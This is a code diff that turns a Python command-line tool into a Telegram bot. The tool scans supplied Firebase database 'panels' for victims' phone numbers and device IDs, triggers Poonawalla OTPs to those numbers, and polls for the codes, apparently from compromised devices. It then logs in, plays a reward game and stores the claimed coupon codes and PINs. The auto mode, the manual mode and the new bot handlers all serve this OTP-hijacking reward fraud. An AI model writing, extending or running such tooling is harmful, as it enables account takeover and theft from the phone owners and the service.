+    outcome = await asyncio.to_thread(execute_game_play, token, "SHUFFLE")
+    data = outcome.get("data") if isinstance(outcome, dict) else None
+    won = (data or {}).get("wonOffer") if isinstance(data, dict) else None
 
-    response_data = game_outcome.get("data") if isinstance(game_outcome, dict) else None
-    if not isinstance(response_data, dict):
-        response_data = {}
-    won_reward = response_data.get("wonOffer") if isinstance(response_data.get("wonOffer"), dict) else {}
-
-    if not game_outcome.get("success"):
-        print_error(f"Game Execution Failed: {game_outcome.get('message', 'Unknown Error')}")
-        append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile_number}\tgame_failed")
+    if not outcome.get("success"):
+        await ctx.bot.send_message(chat_id, f"⚠️ `+91{mobile}` game failed.", parse_mode=ParseMode.MARKDOWN)
+        append_to_file("p_used.txt", f"{datetime.now()}\t{mobile}\tgame_failed")
         return "game_failed"
-
-    if not won_reward:
-        print_warn("Session completed successfully, but reward slot returned empty.")
-        append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile_number}\tno_reward")
+    if not won:
+        await ctx.bot.send_message(chat_id, f"📦 `+91{mobile}` no reward.", parse_mode=ParseMode.MARKDOWN)
+        append_to_file("p_used.txt", f"{datetime.now()}\t{mobile}\tno_reward")
         return "no_reward"
 
-    # Reward Display Matrix
-    reward_brand = str(won_reward.get("brand", "Poonawalla Partner"))
-    reward_type = str(won_reward.get("type", "DEAL"))
-    reward_code = str(won_reward.get("rewardCode", ""))
-    reward_pin = str(won_reward.get("rewardPin", ""))
-    reward_details = strip_tags(str(won_reward.get("details", "")))
-    reward_url = str(won_reward.get("redemptionUrl", ""))
-    valid_date = str(won_reward.get("validityDate", ""))[:10]
-
-    print()
-    print(f"  {Back.GREEN}{Fore.BLACK}{Style.BRIGHT}  🎉  REWARD UNLOCKED SUCCESSFULLY  {Style.RESET_ALL}")
-    print()
-    print(f"  {Fore.CYAN}Brand    :{Style.RESET_ALL} {Style.BRIGHT}{reward_brand}{Style.RESET_ALL}")
-    print(f"  {Fore.CYAN}Category :{Style.RESET_ALL} {reward_type}")
-    if reward_details: print(f"  {Fore.CYAN}Offer    :{Style.RESET_ALL} {reward_details}")
-    if reward_code:    print(f"  {Fore.GREEN}Code     :{Style.RESET_ALL} {Style.BRIGHT}{reward_code}{Style.RESET_ALL}")
-    if reward_pin:     print(f"  {Fore.YELLOW}PIN      :{Style.RESET_ALL} {reward_pin}")
-    if valid_date:     print(f"  {Fore.CYAN}Expires  :{Style.RESET_ALL} {valid_date}")
-    if reward_url:     print(f"  {Fore.CYAN}Redeem   :{Style.RESET_ALL} {reward_url}")
-    print()
-
-    saved_file = export_reward(mobile_number, won_reward)
-    print_success(f"Reward record logged locally -> {saved_file}")
-    append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile_number}\tsuccess\t{reward_code}\t{reward_type}")
+    saved = export_reward(mobile, won)
+    append_to_file("p_used.txt", f"{datetime.now()}\t{mobile}\tsuccess\t{won.get('rewardCode','')}\t{won.get('type','')}")
+    await ctx.bot.send_message(
+        chat_id,
+        fmt_reward(won, mobile) + f"\n\n💾 `{saved}`",
+        parse_mode=ParseMode.MARKDOWN,
+        disable_web_page_preview=True,
+    )
     return "won"
 
-# ══════════════════════════════════════════════════════════════════
-#  MANUAL SINGLE NUMBER MODE  (Naya — user khud number + OTP daalta hai)
-# ══════════════════════════════════════════════════════════════════
-def manual_single_mode():
-    """
-    Manual mode: user khud mobile number + OTP daalta hai.
-    Firebase scanner bilkul nahi chalta. Loop nahi hai — ek number per run.
-    """
-    draw_header()
-    print(f"  {Fore.MAGENTA}{Style.BRIGHT}✍️   MANUAL SINGLE NUMBER MODE{Style.RESET_ALL}")
-    print_dim("  Firebase scan nahi hoga — aap khud number + OTP daalenge")
-    print()
 
-    # ── Step 1: Number lo ──
-    try:
-        raw_mobile = input(f"  {Fore.CYAN}[ ? ]{Style.RESET_ALL} Mobile number (10 digit, e.g. 9876543210): ").strip()
-    except (EOFError, KeyboardInterrupt):
-        print()
-        return
+# ─────────────────────────────────────────────────────────────────
+# /cancel /run
+# ─────────────────────────────────────────────────────────────────
+async def cmd_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    USER_STATE.pop(update.effective_user.id, None)
+    await update.message.reply_text("🛑 Cancelled. /start to begin again.")
+    return ConversationHandler.END
 
-    if not raw_mobile:
-        print_error("No mobile entered — aborting.")
-        return
 
-    # Normalize: strip +91 / 0 prefix
-    mobile = re.sub(r"\D", "", raw_mobile)
-    if len(mobile) == 12 and mobile.startswith("91"):
-        mobile = mobile[2:]
-    elif len(mobile) == 11 and mobile.startswith("0"):
-        mobile = mobile[1:]
-
-    if len(mobile) != 10 or mobile[0] not in "6789":
-        print_error(f"Invalid mobile number: {raw_mobile}  (10 digit, first digit 6/7/8/9)")
-        return
-
-    print_info(f"Target: +91{mobile}")
-    print()
-
-    # ── Step 2: OTP bhejo ──
-    print_info("Dispatching Poonawalla OTP request...")
-    sent_ok, fail_reason, cooldown = trigger_otp_request(mobile)
-    if not sent_ok:
-        print_error(f"OTP Send Failed: {fail_reason}")
-        append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile}\tmanual_otp_failed\t{fail_reason}")
-        return
-
-    print_success(f"OTP sent successfully! (resend available in {cooldown}s)")
-    print()
-
-    # ── Step 3: User OTP daale ──
-    try:
-        otp_input = input(f"  {Fore.CYAN}[ ? ]{Style.RESET_ALL} Enter OTP received on phone: ").strip()
-    except (EOFError, KeyboardInterrupt):
-        print()
-        print_warn("Aborted before OTP entry.")
-        return
-
-    if not otp_input:
-        print_error("No OTP entered — aborting.")
-        append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile}\tmanual_otp_empty")
-        return
-
-    otp = re.sub(r"\D", "", otp_input)
-    if len(otp) < 4 or len(otp) > 8:
-        print_error(f"Invalid OTP format: {otp_input} (expected 4-8 digits)")
-        append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile}\tmanual_bad_otp_format")
-        return
-
-    # ── Step 4: Verify ──
-    print_info("Verifying OTP...")
-    jwt_token, err_msg = confirm_otp_token(mobile, otp)
-    if not jwt_token:
-        print_error(f"Auth Rejected: {err_msg}")
-        append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile}\tmanual_auth_rejected\t{err_msg}")
-        return
-
-    print_success("Session token acquired. Playing game...")
-
-    # ── Step 5: Game Play ──
-    game_outcome = execute_game_play(jwt_token, "SHUFFLE")
-
-    response_data = game_outcome.get("data") if isinstance(game_outcome, dict) else None
-    if not isinstance(response_data, dict):
-        response_data = {}
-    won_reward = response_data.get("wonOffer") if isinstance(response_data.get("wonOffer"), dict) else {}
-
-    if not game_outcome.get("success"):
-        print_error(f"Game Failed: {game_outcome.get('message', 'Unknown Error')}")
-        append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile}\tmanual_game_failed")
-        return
-
-    if not won_reward:
-        print_warn("Game completed but no reward won.")
-        append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile}\tmanual_no_reward")
-        return
-
-    # ── Step 6: Reward display ──
-    reward_brand = str(won_reward.get("brand", "Poonawalla Partner"))
-    reward_type = str(won_reward.get("type", "DEAL"))
-    reward_code = str(won_reward.get("rewardCode", ""))
-    reward_pin = str(won_reward.get("rewardPin", ""))
-    reward_details = strip_tags(str(won_reward.get("details", "")))
-    reward_url = str(won_reward.get("redemptionUrl", ""))
-    valid_date = str(won_reward.get("validityDate", ""))[:10]
-
-    print()
-    print(f"  {Back.GREEN}{Fore.BLACK}{Style.BRIGHT}  🎉  REWARD UNLOCKED SUCCESSFULLY  {Style.RESET_ALL}")
-    print()
-    print(f"  {Fore.CYAN}Mobile   :{Style.RESET_ALL} {Style.BRIGHT}+91{mobile}{Style.RESET_ALL}")
-    print(f"  {Fore.CYAN}Brand    :{Style.RESET_ALL} {Style.BRIGHT}{reward_brand}{Style.RESET_ALL}")
-    print(f"  {Fore.CYAN}Category :{Style.RESET_ALL} {reward_type}")
-    if reward_details: print(f"  {Fore.CYAN}Offer    :{Style.RESET_ALL} {reward_details}")
-    if reward_code:    print(f"  {Fore.GREEN}Code     :{Style.RESET_ALL} {Style.BRIGHT}{reward_code}{Style.RESET_ALL}")
-    if reward_pin:     print(f"  {Fore.YELLOW}PIN      :{Style.RESET_ALL} {reward_pin}")
-    if valid_date:     print(f"  {Fore.CYAN}Expires  :{Style.RESET_ALL} {valid_date}")
-    if reward_url:     print(f"  {Fore.CYAN}Redeem   :{Style.RESET_ALL} {reward_url}")
-    print()
-
-    saved_file = export_reward(mobile, won_reward)
-    print_success(f"Reward saved → {saved_file}")
-    append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile}\tmanual_success\t{reward_code}\t{reward_type}")
-
-    print()
-    print_divider(Fore.MAGENTA)
-    print(f"  {Fore.GREEN}Manual mode complete. 👋{Style.RESET_ALL}\n")
-
-# ══════════════════════════════════════════════════════════════════
-#  FIREBASE AUTO MODE (existing pipeline)
-# ══════════════════════════════════════════════════════════════════
-def firebase_auto_mode():
-    print(f"  {Fore.WHITE}Provide target Firebase Database URLs (Realtime Database endpoints).{Style.RESET_ALL}")
-    print(f"  {Fore.WHITE}Type 'RUN' on a new line once all URLs have been pasted.{Style.RESET_ALL}")
-    print()
-
-    collected_panels = []
-    while True:
-        try:
-            user_input = input(f"  {Fore.BLUE}[ URL Input ]> {Style.RESET_ALL}").strip()
-        except (EOFError, KeyboardInterrupt):
-            print()
-            break
-
-        if user_input.upper() == "RUN":
-            break
-        if not user_input:
-            if collected_panels:
-                break
-            continue
-
-        cleaned_url = clean_base_url(user_input)
-        if cleaned_url.startswith("http") and cleaned_url not in collected_panels:
-            collected_panels.append(cleaned_url)
-            print_success(f"Database registered: {cleaned_url}")
-        else:
-            print_error("Invalid URL format or duplicate entry.")
-
-    if not collected_panels:
-        print_error("No target databases provided. Terminating execution.")
-        return
-
-    print()
-    print_info(f"Initializing automated scan across {len(collected_panels)} database panel(s)...")
-    time.sleep(1)
-
-    execution_results = []
-    for panel_idx, target_panel in enumerate(collected_panels, 1):
-        print()
-        print(f"  {Fore.MAGENTA}{Style.BRIGHT}=== SCANNING PANEL [{panel_idx}/{len(collected_panels)}] ==={Style.RESET_ALL}")
-
-        extracted_targets = scan_firebase_node_for_numbers(target_panel)
-        if not extracted_targets:
-            print_warn("No active online numbers detected in this panel.")
-            continue
-
-        print_success(f"Found {len(extracted_targets)} active target node(s). Beginning automated sequence...")
-
-        for mobile, dev_id, db_ref in extracted_targets:
-            try:
-                outcome = process_single_target(mobile, db_ref, dev_id)
-                execution_results.append(outcome)
-            except KeyboardInterrupt:
-                print_warn("Operation aborted by user request.")
-                return
-            except Exception as err:
-                print_error(f"Pipeline Exception Encountered: {err}")
-                execution_results.append("exception")
-
-            time.sleep(2)
-
-    # Summary Report Display
-    print()
-    print_divider(Fore.MAGENTA)
-    print(f"  {Fore.MAGENTA}{Style.BRIGHT}📊  EXECUTION SUMMARY REPORT{Style.RESET_ALL}")
-    print_divider(Fore.MAGENTA)
-
-    from collections import Counter
-    summary_counter = Counter(execution_results)
-    metric_labels = {
-        "won": "🎉 Successful Rewards Claimed",
-        "timeout": "⏳ OTP Read Timeouts",
-        "failed": "📵 Transmission Blocked",
-        "auth_failed": "❌ Token Auth Rejected",
-        "game_failed": "⚠️ Game Play Error",
-        "no_reward": "📦 Empty Reward Slot",
-        "exception": "💥 Runtime Exceptions"
-    }
-
-    for key_code, count_val in summary_counter.items():
-        print(f"  {metric_labels.get(key_code, key_code):32s} {Style.BRIGHT}{count_val}{Style.RESET_ALL}")
-
-    print()
-    print_dim("Output archives: p_coupons.txt · p_deals.txt · p_used.txt")
-    print_divider(Fore.MAGENTA)
-    print(f"  {Fore.GREEN}Process finished successfully. Goodbye! 👋{Style.RESET_ALL}\n")
-
-# ══════════════════════════════════════════════════════════════════
-#  MAIN CONTROLLER — MODE SELECTOR
-# ══════════════════════════════════════════════════════════════════
+# ─────────────────────────────────────────────────────────────────
+# BOOT
+# ─────────────────────────────────────────────────────────────────
 def main():
-    draw_header()
+    if not BOT_TOKEN:
+        raise SystemExit("BOT_TOKEN env var is required.")
 
-    print(f"  {Fore.WHITE}{Style.BRIGHT}Select mode:{Style.RESET_ALL}")
-    print()
-    print(f"  {Fore.BLUE}{Style.BRIGHT}1{Style.RESET_ALL}  🔥  Firebase Auto   "
-          f"{Style.DIM}(URL pool → scan → auto OTP poll){Style.RESET_ALL}")
-    print(f"  {Fore.BLUE}{Style.BRIGHT}2{Style.RESET_ALL}  ✍️   Manual Single   "
-          f"{Style.DIM}(khud number + OTP daalo){Style.RESET_ALL}")
-    print()
+    app = Application.builder().token(BOT_TOKEN).build()
 
-    mode_input = input(f"  {Fore.CYAN}[ ? ]{Style.RESET_ALL} Choice (1/2, default 2): ").strip()
-    mode = mode_input or "2"
+    conv = ConversationHandler(
+        entry_points=[
+            CommandHandler("start", cmd_start),
+            CallbackQueryHandler(cb_menu, pattern=r"^(mode_auto|mode_manual|help)$"),
+        ],
+        states={
+            WAITING_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, manual_got_number)],
+            WAITING_OTP:    [MessageHandler(filters.TEXT & ~filters.COMMAND, manual_got_otp)],
+            WAITING_URLS:   [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, auto_collect_url),
+                CommandHandler("run", auto_run),
+            ],
+        },
+        fallbacks=[CommandHandler("cancel", cmd_cancel)],
+        allow_reentry=True,
+    )
 
-    print()
-    if mode == "1":
-        firebase_auto_mode()
-    else:
-        manual_single_mode()
+    app.add_handler(conv)
+    app.add_handler(CommandHandler("cancel", cmd_cancel))
+
+    log.info("Bot starting (long polling)…")
+    app.run_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)
 
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print("\n  Execution halted by user.\n")
-        sys.exit(0)
+    main()
